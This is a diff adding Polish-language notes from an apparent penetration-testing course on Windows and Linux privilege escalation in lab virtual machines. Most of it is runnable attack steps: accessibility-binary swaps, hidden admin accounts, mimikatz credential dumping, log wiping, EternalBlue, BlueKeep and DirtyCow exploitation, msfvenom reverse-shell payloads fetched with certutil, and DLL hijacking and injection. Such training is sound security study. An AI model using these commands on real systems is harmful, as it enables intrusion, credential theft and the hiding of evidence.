@@ -1,0 +1,891 @@
+📅 06.11.2022 🕘 [09:00]
+
+Wykładowca: Przemysław Mazurek
+
+Global Cross Platform Elevation of Privilege Escalation
+
+Chapter 1 Windows Local PE & Post Exploitation
+= - = - = - = - = - = - =  - = - = - = - = - = 
+
+ℹ️ Przerwy:
+
+10.30-11.00
+12.30-13.00
+15.00-15.30
+
+***
+
+[Windows Local Privilege Escalation]
+
+🔗 -- Maszyny do pobrania:
+https://kali.download/virtual-images/kali-2022.3/kali-linux-2022.3-virtualbox-amd64.7z
+https://cdimage.kali.org/kali-2022.3/kali-linux-2022.3-live-amd64.iso
+https://ln2.sync.com/dl/18471cf80/b35aktbm-c56q78nf-hqncmvc6-svsgx7sg/view/default/9291869110007
+
+🔗 -- Materaiały do zajęć:
+https://www.hackampus.com/book/361/chapter/2426/subject/6755
+
+#Tworzy pendrive z obrazem ISO Systemu operacyjnego:
+rufus I unetbootin
+
+#Komenda do restartu:
+Shoutdown /a
+
+***
+
+### 📋 – Lab01 Ease of Access Manipulation
+
+#Na maszynie Windows 10 należy wyłączyć sieć.
+Start -> Update -> Pause update for 7 days
+#Instalacja Guest Addition
+
+#tworzenie usera z poziomu cmd - uruchomionego jako Administrator:
+net user hacker2 12345678 /add
+
+#Przygotowanie maszyny do uruchomienia z Kali Live z płyty CD:
+#Należy zrobić snapshot maszyny i wyłączyć maszynę.
+#Aby "włożyć płytę KALI Live do napędu należy wejść:
+Storage -> Add Controler -> i dodać (+) PIIX4 -> a następnie dodać (+) tam obraz maszyny Kali Live ISO.
+#restart Windowsa (odpali się Kali).
+
+#Należy uruchomić terminal:
+sudo su
+mkdir /mnt/C
+#sprawdzamy, który dysk może być naszym dydkiem C: z systemu Windows.
+fdisk -l  
+#montujemy dysk C:
+mount /dev/sda2 /mnt/C
+
+------------------------------------------------
+#w przypadku problemów z montowaniem dysku C:
+ntfsfix /dev/sda2
+#lub uruchomić ponownie Windows i z poziomu cmd - uruchomionego jako Administrator #wyłączyć hibernację:
+powercfg /h off
+------------------------------------------------
+
+cd /mnt/C/Windows/system32
+ls | grep Utilman.exe
+cp Utilman.exe BackupUtilman.exe
+cp sethc.exe backupsethc.exe
+cp cmd.exe Utilman.exe
+cp /mnt/C/Windows/System32/WindowsPowerShell/v1.0/powershell.exe sethc.exe
+sync
+#wyłączenie maszyny i usunięcie kontrolera z płytą (PIIX4)
+#i uruchomienie systemu Windows.
+#Na ekranie logwowania (nie logujemy sie):
+#klikamy na ikonkę "zegrka" w prawym dolnym rogu i pojawia się cmd
+
+#sprawdzamy uprawnienia
+whoami 
+#jako wynik mamy: NT authority system
+#zakładamy nowego usera
+net user hacker3 12345678! /add
+net localgroup administrators hacker3 /add
+#w przypadku systemu Windows w polskiej wersji językowej:
+net localgroup administratorzy hacker3 /add
+whoami /all
+
+***
+
+### 📋 – Lab02 Local PE via Defender
+
+#przywrócić Windows10 ze snapshot-a
+#uruchomić ponownie Windows i z poziomu cmd - uruchomionego jako Administrator #wyłączyć hibernację:
+powercfg /h off
+
+Storage -> Add Controler -> i dodać (+) PIIX4 -> a następnie dodać (+) tam obraz maszyny Windowsa10, wersja instalacyjna
+#restart Windowsa (odpali się instalator Windows).
+#szybko kliknąć przycisk aby włączyć instalator
+#Klikamy przycisk next a następnie repair your computer
+#W widoku choose an option wybieramy troubleshoot a następnie cmdline.
+
+#sprawdzamy jakie są dyski:
+wmic logicaldisk get name
+#szukamy dysku z katalogiem Windows:
+c:
+dir
+d:
+dir
+cd Windows/system32
+copy sethc.exe sethc_backup.exe
+copy ftp.exe sethc.exe
+copy Utilman.exe BackupUtilman.exe
+copy ftp.exe Utilman.exe
+
+#wyłączenie maszyny i usunięcie kontrolera z płytą (PIIX4)
+#i uruchomienie systemu Windows.
+#po restarcie 5x shift aby uruchomić sethc.exe (czyli ftp)
+
+#komendy z wykrzyknikiem (!) na początku bo pracujemy z ftp:
+!whoami
+!net user <nazwa_uzytkownika> <haslo> /add
+!net localgroup <nazwa_grupy (administrators lub adminisratorzy)> <nazwa_uzytkownika> /add
+
+***
+
+### 📋 – Lab03 BitLocker Disk Encryption
+
+Win+R > gpedit.msc `Run as Administrator`
+
+Computer Configuration -> Administrative templates -> Windows Components -> Bitlocker Drive Encryption -> Operating System Drives
+
+Require additional authentication at startup > <Enabled>
+
+Local Disk C:/ (w eksploratorze plików) --> Prawy Przycisk Myszy --> Turn on BitLocker
+
+Enter a password: ******
+
+***
+
+### 📋 -- Lab04 VeraCrypt Disk Encryption
+
+🔗 -- Download VeraCrypt 1.25.9
+https://launchpad.net/veracrypt/trunk/1.25.9/+download/VeraCrypt%20Setup%201.25.9.exe
+
+VeraCrypt --> System --> Encrypt System Partition/Drive
+
+***
+
+[Windows Post Exploitations & Credentials Dumping]
+
+### 📋 -- Lab05 Hiding a User
+
+cmd `Run as Administrator`
+
+    net user hacker3 12345678 /add
+
+    net localgroup administrators hacker3 /add
+
+    net users
+
+
+    wmic useraccount where name="hacker3" call rename name="hacker3$"
+
+    net users
+
+
+user `hacker3` został ukryty
+
+# sprawdzenie ukrytych user'ów przez powershell
+
+    powershell -ep bypass -c "Get-LocalUser"
+
+
+po wykonaniu tej komendy user `hacker3` jest widoczny
+
+***
+
+### 📋 -- Lab06 Hiding a User from the Logon Screen
+
+Win+R > regedit `Run as Administrator`
+
+    Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
+
+    Tworzymy nowy klucz `SpecialAccounts`
+
+    W `SpecialAccounts` tworzymy nowy klucz `UserList`
+
+    Dodajemy rekord DWORD (32 bit) dla użytkownika hacker3$ i ustawiamy Value name na hacker3$, a Value data na 0
+
+    Win10 Restart
+
+    user `hacker3` nie jest widoczny na ekranie logowania, ale widać go z poziomu powershell
+
+
+Wywołanie komendy jako user hacker3:
+    runas /user:"hacker3$" cmd.exe
+
+***
+
+🔗 -- Sysinternals Suite
+https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite
+
+### 📋 -- Lab07 Hash Cracking with Mimikatz
+
+Windows 10 | NAT Network
+
+    Utworzenie dwóch nowych użytkowników
+
+    net user test qwerty /add
+
+    net user tes2t asdfg /add
+
+    Wyłącznie Defender
+
+    🔗 – Download mimikatz https://github.com/gentilkiwi/mimikatz/releases
+
+    Wyłączenie interface'u sieciowego
+
+    cmd `Run as Administrator`
+
+    mimikatz
+
+    Włączenie trybu uprawnień debug'owania
+
+    privilege::debug
+
+    Podniesienie uprawnień do NT-Authority
+
+    token::elevate
+
+    Zrzut pliku bazy SAM (Security Account Manager)
+
+    lsadump::sam
+
+
+Kali | NAT Network
+
+    Kopiujemy Hash NTLM użytkowników: Admin, hacker2, hacker3, test, test2 do pliku `hashe.txt`
+
+    Wypakowanie pliku rockyou.txt z lokalizacji /usr/share/wordlists/
+
+    sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
+
+    Łamanie hash'y haseł z wykorzystaniem hashcat
+
+    🔗 -- Example hashes https://hashcat.net/wiki/doku.php?id=example_hashes
+
+
+    hashcat -m 1000 /home/kali/Desktop/hashe.txt /usr/share/wordlists/rockyou.txt -o /home/kali/Desktop/results.txt
+
+
+    Łamanie hash'y haseł z wykorzystaniem john
+
+
+    john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashe.txt
+
+
+***
+
+Dodatkowe słowniki Seclists
+
+apt install seclists
+
+***
+
+📋 – Lab08 Covering Tracks
+
+    Event Viewer - weryfikacja istniejących log’ów
+
+    eventvwr
+
+
+    mimikatz `Run as Administrator`
+
+    privilege::debug 
+
+    Usunięcie wszystkich log’ów
+
+    event::drop
+
+    Wyczyszczenie log’ów
+
+    event::clear
+
+
+***
+
+📅 19.11.2022 🕘 [09:00]
+
+Global Cross Platform Elevation of Privilege Escalation
+
+Chapter 2 Linux Local PE & Post Exploitations and Linux Automated Tasks & Permission Misconfiguration
+= - = - = - = - = - = - =  - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = 
+
+[Linux Local PE & Post Exploitations]
+
+### 📋 – Lab01 Bypassing Grub
+
+    podczas startu Kali nacisnąć klawisz e
+
+    podmienić linię ro quiet splash ==> rw init=/bin/bash
+
+    Ctrl + X
+
+    Dodanie nowego użytkownika:
+
+    adduser hacker4
+
+    pass: 1234
+
+    adduser hacker4 sudo
+
+    sync
+
+    reboot -f
+
+
+***
+
+### 📋 – Lab02 Mounting
+
+    Dodajemy Kali Live ISO i bootujemy z CD-ROM F12 podczas rozruchu
+
+    Montowanie dysku
+
+    sudo su
+
+    fdisk -l
+
+    mount /dev/sda1 /mnt
+
+    mount --rbind /root /root
+
+    Dodanie nowego użytkownika
+
+    adduser hacker2
+
+    adduser hacker2 sudo
+
+    sync
+
+    reboot -f
+
+
+***
+
+🔗 --
+Co to jest i do czego służy Peppered Password?
+https://kapitanhack.pl/2022/05/02/nieskategoryzowane/co-to-jest-i-do-czego-sluzy-peppered-password/
+
+
+### 📋 – Lab03 Cracking Passwords
+
+john
+
+    Zakładamy nowych użytkowników:
+
+    adduser hacker4 / qwerty12
+
+    adduser hacker5 / AaSsDd
+
+    Pobranie do pliku oraz łamanie hash’y
+
+    sudo unshadow /etc/passwd /etc/shadow > passwords.txt
+
+    sudo john --format=crypt passwords.txt
+
+    sudo john --show passwords.txt
+
+
+hashcat
+
+    nano hash.txt
+
+    hash sha512crypt $6$, SHA512 $6$QvPAw9OBt..VnSAU$wyeJkkHdxeVtsP7GVe7neOWclI/8PEWHKTHHvbuPUVH21sdOBLC.vcgrS0.WmeNs4sOLX0HeBDQto3YNwHBnV0 (kali)
+
+    https://hashcat.net/wiki/doku.php?id=example_hashes
+
+    hashcat -m 1800 staryhash.txt lista
+
+
+***
+
+### 📋 – Lab04 Running Enumeration Scripts
+
+1. LinEnum
+
+git clone https://github.com/rebootuser/LinEnum.git
+cd LinEnum
+chmod +x LinEnum.sh
+./LinEnum.sh
+
+2. pspy
+
+sudo mkdir pspy
+cd pspy
+sudo wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
+sudo chmod +x pspy64
+./pspy64
+
+3. linpeas
+
+sudo wget https://github.com/carlospolop/PEASS-ng/releases/download/20221113/linpeas.sh
+sudo chmod +x linpeas.sh
+./linpeas.sh
+
+***
+
+Manualne metody wyszukiwania PE
+🔗 – Basic Linux Privilege Escalation - g0tmi1k
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+
+***
+
+### 📋 – Lab05 Covering Tracks
+
+cat /var/log/auth.log | grep -Eav "hacker|1001"
+cat /var/log/auth.log | grep -Eav "hacker|1001" > a && sudo mv a /var/log/auth.log
+
+***
+
+### 📋 – Lab06 Grub Password
+
+grub-mkpasswd-pbkdf2
+sudo grub-mkconfig -o /boot/grub/backupGrub.cpg
+
+set superusers="root"
+password_pbkdf2 root <hash>
+
+update-grub
+
+***
+
+[Linux Automated Tasks & Permission Misconfiguration]
+
+### 📋 – Lab07 Plain Text Passwords
+
+ls -lah
+
+https://chmod-calculator.com/
+
+https://beyond.hackampus.com/canvas/general/general-SqPx8-2021.01.10.09.36.56-plain.rar
+
+sudo chmod 711 plain
+
+https://www.base64decode.org/
+
+***
+
+### 📋 – Lab08 SUID Exploitation
+
+chmod 777 suid_practice
+
+ls -l | grep suid_practice
+
+./suid_practice
+
+find / -perm /4000 -user root -exec ls -ldb {} \; 2>/dev/null
+
+https://gtfobins.github.io/
+
+https://ln4.sync.com/dl/76c30ec80/qaebu6y4-vafbinja-4h7qwx7s-ex2fb73z
+
+https://pentestlab.blog/category/privilege-escalation/
+
+https://www.netspi.com/blog/technical/network-penetration-testing/linux-hacking-case-studies-part-4-sudo-horror-stories/
+
+https://www.icloud.com/iclouddrive/0c5M0j7milKwffvV_FcrO0oZg#Debian_6_64-bit_(Workshop)
+(username: user / password: password321, username: root / password: password123)
+
+https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf
+
+***
+
+📅 20.11.2022 🕘 [09:00]
+
+Global Cross Platform Elevation of Privilege Escalation
+
+Chapter 3 Common Exploits and Buffer Overflow & Unquoted Services and DLL HiJacking & Permission Misconfiguration
+= - = - = - = - = - = - =  - = - = - = - = - = - = - = - = - = - = - = - = - = - = - =
+
+[Common Exploits and Buffer Overflow]
+
+🔗 -- Link do materiałów:
+https://www.hackampus.com/book/361/chapter/2441/subject/6773
+
+🔗 – A Beginner’s Guide to Buffer Overflow Vulnerability
+https://medium.com/techloop/understanding-buffer-overflow-vulnerability-85ac22ec8cd3
+
+ 🔗 – Buffer Overflow - TryHackMe Academy
+https://tryhackme.com/room/bufferoverflowprep
+
+***
+
+### 📋 – Lab01 EternalBlue
+
+Sieć NatNetwork
+
+Login root
+Hasło toor
+
+#sprawdzamy co jest na maszynie EtheralBlue
+nmap -sV IP_maszyny_EthernalBlue
+nmap -sV -Pn IP_maszyny_EthernalBlue
+nmap -sV -Pn IP_maszyny_EthernalBlue -p 445
+nmap -sV -Pn IP_maszyny_EthernalBlue -p 445 --script smb-vuln-ms17-010
+
+use auxiliary/scanner/smb/smb_ms17_010
+set rhosts  IP_maszyny_EthernalBlue
+run
+
+use exploit/windows/smb/ms17_010_eternalblue
+options
+set rhosts  IP_maszyny_EthernalBlue
+exploit (lub run)
+
+#po otrzymaniu meterpretera:
+sysinfo
+screenshare
+getpid
+ps
+#z poziomu meterpretera: migracja do innego procesu - id 
+migrate 1424  
+shell
+whoami
+cd c:\users\root\desktop
+mkdir test1234
+exit 
+#z poziomu meterpretera
+execute -f calc.exe
+execute -f mspaint.exe
+#zrzucamy do tła
+bg
+#widzimy nawiązane sesje
+sessions
+#zabijanie sesji
+sessions -k 1
+
+***
+
+### 📋 – Lab02 BlueKeep
+
+#To samo środowisko jak poprzednio.
+nmap IP_maszyny_EthernalBlue -p3389 -PN
+#nalezy włączyć opcję RDP
+Cntrol Panel-> System security-> System
+opcja: "Allow connections from computers running any version od Remote Desktop"
+#z poziomu msfconsole:
+search bluekeep
+use scanner/rdp/cve_2019_0708_bluekeep
+set rhost IP_maszyny_EthernalBlue
+set verbose true
+options
+run
+
+#Roziwązanie problemów z Metasploit
+#Aktualizacja Metasploit
+apt update ; apt install metasploit-framework
+
+#edytujemy plik przy pomocy mousepad - jako root
+/usr/share/metasploit-framework/config/openssl.conf
+
+#dodajemy:
+openssl_conf = openssl_init
+[openssl_init]
+providers = provider_sect
+ssl_conf = ssl_sect
+[provider_sect]
+default = default_sect
+legacy = legacy_sect
+[default_sect]
+activate = 1
+[legacy_sect]
+activate = 1
+[ssl_sect]
+system_default = system_default_sect
+[system_default_sect]
+Options = UnsafeLegacyRenegotiation 
+
+🔗 – więcej informacji o rozwiązniu problemu:
+https://github.com/rapid7/metasploit-framework/issues/16954
+
+search bluekeep
+use windows/rdp/cve_2019_0708_bluekeep_rce
+options
+set rhost IP_maszyny_EthernalBlue
+set verbose true
+run
+show targets
+set target 2  (Win7 sp1)
+run
+set groomsize 25
+run
+show advanced
+set groomsize 50
+run
+
+🔗 – Metasploit: Introduction 
+https://tryhackme.com/room/metasploitintro
+🔗 – CTF Basic Pentesting 
+https://tryhackme.com/room/basicpentestingjt
+🔗 – Advent of Cyber 2022 
+https://tryhackme.com/room/adventofcyber4
+
+***
+ 
+### 📋 – Lab03 DirtyCow
+
+dirtycow - weak:<no password>
+
+#Na Kali
+mkdir exploitsuggester
+cd exploitsuggester
+wget https://github.com/mzet-/linux-exploit-suggester/blob/master/linux-exploit-suggester.sh
+lub 
+wget git clone https://github.com/mzet-/linux-exploit-suggester.git
+sudo chmod +x linux-exploit-suggester.sh
+./linux-exploit-suggester.sh
+
+#na dirtycow (NatNetwork)
+mkdir exploitsuggester
+cd exploitsuggester
+wget git clone https://github.com/mzet-/linux-exploit-suggester.git
+
+https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
+
+mkdir cow
+cd cow
+wget https://gist.githubusercontent.com/rverton/e9d4ff65d703a9084e85fa9df083c679/raw/9b1b5053e72a58b40b28d6799cf7979c53480715/cowroot.c
+gcc cowroot.c -o cowroot -pthread
+ls
+./cowroot
+cp /tmp/bak /usr/bin/passwd
+adduser hacker6
+adduser hacker6 sudo
+su hacker6
+sudo cat /etc/shadow
+
+***
+
+[Unquoted Services and DLL HiJacking & Permission Misconfiguration]
+
+Pobranie obiektów reprezentujących deskryptor zabezpieczeń pliku lub zasobu.
+Deskryptor zabezpieczeń zawiera listy kontroli dostępu (ACL).
+Lista ACL określa uprawnienia, jakie posiadają użytkownicy i grupy użytkowników, aby uzyskać dostęp do zasobu.
+
+    get-acl <plik> | fl
+
+
+***
+
+### 📋 – Lab04 Accesschk & Task Scheduler
+
+VM Windows 10
+4GB RAM
+2x CPU
+
+🔗 – Do pobrania pakiet SysInternals
+https://download.sysinternals.com/files/SysinternalsSuite.zip
+
+    Virus & thread protection > all OFF
+
+    Zatrzymać usługę Windows Update
+
+
+    Sprawdzenie uprawnień do plików `cmd as Administartor`
+
+    cd C:\Users\admin\Desktop\SysinternalsSuite
+
+    net users
+
+    net user nowyhacker 123456 /add
+
+    icacls "C:\ProgramData" /q /c /t /grant Users:F #uprawnienia do wykonywania na wszystkie pliki w katalogu
+
+    accesschk.exe -uqws "nowyhacker" C:\*
+
+
+    Tworzenie nowego pliku skrypt1.bat
+
+    echo "test1" > C:\ProgramData\plik1.bat
+
+
+    Stworzenie nowego Admina lokalnego
+
+    net user nowyadmin 123456 /add
+
+    net localgroup administrators nowyadmin /add
+
+
+    Utworzenie nowego zadania w Task Scheduler
+
+    schtasks /create /sc minute /mo 1 /tn "nowezadanie" /tr "C:\ProgramData\skrypt1.bat" /ru nowyadmin /rp 123456 /rl highest
+
+
+    Sprawdzenie kolejki zadań
+
+    schtasks /query
+
+    schtasks /query | find "nowezadanie"
+
+    schtasks /query /tn nowezadanie /fo list /v
+
+
+    Logowanie na użytkownika nowyhacker (bez uprawnień Administatora)
+
+
+    Edycja skrypt1.bat
+
+    net user nowyhackeradmin 123456 /add
+
+    net localgroup administrators nowyhackeradmin /add
+
+
+    Weryfikacja dodania nowego usera
+
+    net users
+
+
+    Pojawił się nowy użytkownik nowyhackeradmin
+
+
+***
+
+### 📋 – Lab05 Unquoted Services
+
+VM Windows 10
+NAT Network
+
+VM Kali
+NAT Network
+
+🔗 – Download Amiti Antivirus
+https://www.netgate.sk/download/download.php?id=11
+
+🔗 – Download Bat To Exe Converter Portable 3.0.9.0
+http://www.softoware.org/developer-tools/get-bat-to-exe-converter-portable-for-windows-10-os.html
+
+    Instalacja Amiti Antivirus (aplikacja podatna na Unquoted Services)
+
+
+    cmd as Administartor
+
+    icacls.exe "C:\Program Files\NETGATE" /q /c /t /grant Users:F
+
+    wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """
+
+
+    Tworzymy skrypt.bat
+
+    @echo off
+
+    net user nowyhackeradmin2 1234567 /add
+
+    net localgroup administrators nowyhackeradmin2 /add
+
+
+    Bat To Exe Converter
+
+    Convert > skrypt.bat > evil.exe
+
+
+    Zmiana nazwy z evil.exe na Amiti.exe
+
+
+    Po nowym zalogowaniu wykona się nasz plik Amiti.exe i utworzy nowego użytkownika nowyhackeradmin2
+
+
+VM Kali
+
+    Tworzenie payload'u
+
+    sudo su
+
+    msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=53 -f exe -o Amiti.exe
+
+
+    Uruchomienie listenera z drugiego terminala jako kali
+
+    nc -lnvp 53
+
+
+    Serwer www na porcie 4444
+
+    python3 -m http.server 4444
+
+
+    W Win10 uruchamiamy internet
+
+    Pobieramy plik przez przeglądarkę
+
+    http://10.0.2.15:4444/Amiti.exe
+
+    lub z cmd w katalogu C:\Program Files\NETGATE
+
+    certutil -urlcache -f http://10.0.2.15:4444/Amiti.exe Amiti.exe
+
+
+    Restart Windows 10
+
+
+***
+
+### 📋 – Lab06 DLL Hijacking
+
+VM Kali
+
+    Payload
+
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=53 -f dll -o evil.dll
+
+    Serwer www na porcie 4444
+
+    python3 -m http.server 4444
+
+    metasploit
+
+    use multi/handler
+
+    set payload windows/meterpreter/reverse_tcp
+
+    set LHOST eth0
+
+    set LPORT 53
+
+    exploit
+
+
+VM Windows 10
+
+    Uruchomienie procmon.exe z pakietu Sysinternals
+
+    Uruchomienie bginfo.exe
+
+    Procmon
+
+    Opcje filtra:
+
+    - Process name is Bginfo64.exe then Include
+
+    - Path ends with dll then Include
+
+    - Result is Name not found then include
+
+    Pobieramy plik evil.dll przez przeglądarkę
+
+    Zmienamy nazwę evil.dll na WINSTA.dll w katalogu gdzie znajduje się bginfo.exe
+
+
+***
+
+### 📋 – Lab07 DLL Injection
+
+🔗 -- Download script Invoke-DllInjection.ps1
+https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1
+
+    Powershell as Administrator
+
+    Set-ExecutionPolicy Bypass
+
+
+    Edycja zawartości skryptu
+
+    $GetProcAddress=$UnsafeNativeMethods.GetMethod('GetProcAddress')
+
+    na
+
+    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress',[reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);
+
+
+    ps dla procesu winlogon 552
+
+    ps
+
+
+    Wstrzyknięcie do procesu
+
+    Import-Module .\Invoke-DllInjection.ps1
+
+    Invoke-DllInjection -ProcessID 552 -Dll injected.dll
+
+
+***
+
+Final Project
+
+Część 1 : https://ln5.sync.com/dl/923bd0150/j47e7xew-humxhdmt-3ysknpve-g6bnfgdr
+Część 2 : https://ln5.sync.com/dl/855f1c7d0/96abr2av-att7kcrf-j5bm5hu7-tb7jskcc
+Część 3 : https://ln5.sync.com/dl/1f80396c0/y8c4c7kg-zkmmzvvt-34a7t6eq-7yfew966
+
+
